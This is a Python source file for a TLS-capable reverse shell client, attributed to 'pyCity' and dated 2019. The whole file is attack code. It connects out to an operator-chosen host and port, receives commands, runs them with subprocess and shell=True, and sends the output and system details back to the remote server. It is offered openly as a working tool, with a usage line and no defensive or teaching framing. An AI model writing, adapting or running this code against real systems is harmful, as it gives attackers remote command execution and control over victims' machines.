#!/usr/bin/env python3

"""
Author       - pyCity
Date         - 2/2/2019
Version      - 1.1

Usage:       - python client.py --tls 127.0.0.1 4444

Description: - Reverse shell in python 3. Uses TLS encryption with
             - a DHE-RSA-AES256-SHA256 cipher.
"""

import socket
import subprocess
import os
import platform
import sys
import time
import argparse
import ssl


class Client:

    s = socket.socket()
    socket.setdefaulttimeout(10)

    def __init__(self, host, port, enc):
        self.host = host
        self.port = port
        self.enc = enc

    def connect(self, s):
        """Enable encryption and connect socket object to server"""

        # Wait 5 secs if connection is not immediately successful
        for i in range(10):
            try:
                if enc == True:
                    context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
                    context.set_ciphers('DHE-RSA-AES256-SHA256')
                    context.load_dh_params("dhparam.pem")
                    context.load_cert_chain(certfile="server.crt", keyfile="server.key")
                    s = context.wrap_socket(s, do_handshake_on_connect=True)
                s.connect((host, port))
            except:
                time.sleep(5)

    def shell(self, s):
        """Receive commands from remote server and run on local machine (with added
           convenience calls)"""

        while True:
            data = s.recv(1024).decode("utf-8")
            if data[:2] == 'cd':
                os.chdir(data[3:].strip())
            elif data[:2].strip() == "os":
                s.send(str.encode(" -- OS : " + sys.platform + " " + platform.release() + "\n" +
                                  " -- Build : " + platform.version() + "\n" +
                                  " -- Python version : " + platform.python_version() + "\n"))
            elif data[:4].strip() == "kill":
                break
            if len(data) > 0:
                cmd = subprocess.Popen(data[:], shell=True,
                                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                                       stdin=subprocess.PIPE)

                bytes_recieved = cmd.stdout.read() + cmd.stderr.read()
                output = str(bytes_recieved, "utf-8")
                s.send(str.encode(output + str(os.getcwd()) + '#> '))
        s.close()
        sys.exit()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Python remote tcp client")
    parser.add_argument("host", help="Remote host name to connect to")
    parser.add_argument("port", help="Remote port to connect to", type=int)
    parser.add_argument("--tls", help="Enable TLS encryption", action="store_true")

    args = parser.parse_args()
    host, port, enc = args.host, args.port, args.tls


    client1 = Client(host, port, enc)
    client1.connect(client1.s)
    client1.shell(client1.s)
